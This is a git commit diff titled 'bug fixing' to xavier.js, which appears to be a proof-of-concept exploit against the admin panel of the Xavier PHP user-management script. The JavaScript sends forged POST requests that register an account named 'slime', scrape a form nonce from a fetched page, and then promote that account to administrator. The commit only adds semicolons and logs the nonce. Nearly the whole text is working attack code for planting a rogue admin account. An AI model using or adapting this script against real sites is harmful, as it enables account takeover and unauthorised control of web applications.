a5783b0eb4485626a7595f95270c07491a169300
mqt <maxim@ingredous.com>
2019-07-21 18:59:41 -0700

    bug fixing

--- xavier.js
+++ xavier.js
@@ -1,7 +1,7 @@
-var root = ""
+var root = "";
 var req = new XMLHttpRequest();
-var url = root + "/xavier-demo/admin/includes/adminprocess.php"
-var params = "user=slime&firstname=slime&lastname=slime&pass=SupermanSuperman&conf_pass=SupermanSuperman&email=slime%40Superman.com&conf_email=slime%40Superman.com&form_submission=admin_registration"
+var url = root + "/xavier-demo/admin/includes/adminprocess.php";
+var params = "user=slime&firstname=slime&lastname=slime&pass=SupermanSuperman&conf_pass=SupermanSuperman&email=slime%40Superman.com&conf_email=slime%40Superman.com&form_submission=admin_registration";
 req.open("POST", url, true);
 req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req.send(params);
@@ -13,7 +13,8 @@ req2.send();
 var nonce = regex.exec(req2.responseText);
 var nonce = nonce[1];
 var url3 = root + "/xavier-demo/admin/includes/adminprocess.php";
-var params2 = "delete-user="+nonce+"&form_submission=delete_user&usertoedit=slime&button=Promotetoadmin"
+var params2 = "delete-user="+nonce+"&form_submission=delete_user&usertoedit=slime&button=Promotetoadmin";
 req2.open("POST", url3, true);
 req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req2.send(params2);
+console.log(nonce);
